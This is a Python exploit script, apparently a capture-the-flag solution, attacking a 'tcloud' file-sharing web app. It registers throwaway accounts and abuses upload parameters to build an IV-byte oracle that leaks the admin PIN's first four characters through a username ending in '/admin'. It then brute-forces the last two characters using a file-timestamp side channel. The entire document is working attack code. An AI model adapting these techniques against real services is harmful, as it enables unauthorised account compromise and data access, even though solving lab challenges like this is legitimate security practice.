#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import requests
import re
import string
from pprint import pprint 

url = "http://127.0.0.1/tcloud/"
#url = "http://192.168.201.4/tcloud/"
s = requests.session()

def register(username, password, pin):
    #log.info(username)
    r = s.post(url + "login.php?action=register", data={"username": username, "password": password, "pin": pin})
    assert "Sign up successfully!" in r.content
    #log.success("register successfully")

def login(username, password):
    r = s.post(url + "login.php?action=login", data={"username": username, "password": password})
    assert "Login successfully!" in r.content
    #log.success("login successfully")

def upload(filename, encrypt="no"):
    r = s.post(url + "admin/?p=upload", data={"password": "4150000000000000", "params[sharing]": "on", "params[encrypt]": encrypt}, files={"files": open(filename,'rb')})
    assert "uploaded successfully" in r.content
    link = url + "admin/files/" + re.findall("Here is the link: ([0-9a-z]{32}/.*)</p>", r.content)[0]
    #log.success("upload: " + link)
    return link

def upload2(filename, n=1):
    r = s.post(url + "admin/?p=upload", data={"password": r"\000184000000000", "params[%s]" % ("_" * n): "on"}, files={"files": open(filename,'rb')})
    r = re.findall("Invalid character \((.*)\)", r.content)
    if r:
        return r[0]

def download(_id, pin):
    r = s.get(url + "admin/?p=download&id=%s&pin=%s" % (_id, pin) )
    return r.content

def profile():
    r = s.get(url + "admin/?p=profile")
    profile = re.findall("<h4>(.*): (.*)</h4>", r.content)
    profile = dict(profile)
    return profile

def files():
    r = s.get(url + "admin/?p=files")
    files = re.findall("<td>(.*)</td>", r.content)
    return [files[i:i+3] for i in range(0, len(files), 4)]

# overwrite last byte of iv to \x00 and collect ciphers
charset = string.digits + string.lowercase
data = {}
for i in charset:
    username = randoms(10)
    password = "orangenogg"
    register(username, password, i * 6)
    login(username, password)
    c = upload2("./file.txt")
    data[c] = i

# leak admin pin[0:4]
username = randoms(10) + "/admin"
password = "orangenogg"
register(username, password, "000000")
login(username, password)
log.info(profile())

c4 = upload2("./file.txt", 1)
c3 = upload2("./file.txt", 2)
c2 = upload2("./file.txt", 3)
c1 = upload2("./file.txt", 4)

admin_pin = data[c1] + data[c2] + data[c3] + data[c4]
log.success("admin pin = " + admin_pin + "??")

# brute force last 2 bytes
files = files()
pprint(files)
file_id = files[0][0]

# get original timestamp of test1.text.out file
r = requests.get(url + "admin/files/e020590f0e18cd6053d7ae0e0a507609/")
orig_time =  re.findall(r'<td align="right">(2017-\d\d-\d\d \d\d:\d\d)', r.content)[0]
log.info("original timestamp = " + orig_time)

# try to download it, if pin is correct, timestamp will be updated
p = log.progress("Brute Force")
for i in charset:
    for j in charset:
        pin = admin_pin + i + j
        p.status("Trying " + pin)
        download(file_id, pin)
        # check if timestamp updated
        r = requests.get(url + "admin/files/e020590f0e18cd6053d7ae0e0a507609/")
        time =  re.findall(r'<td align="right">(2017-\d\d-\d\d \d\d:\d\d)', r.content)[0]
        if time != orig_time:
            p.success("Done")
            log.success("pin found !! [%s]" % pin) 
            exit()

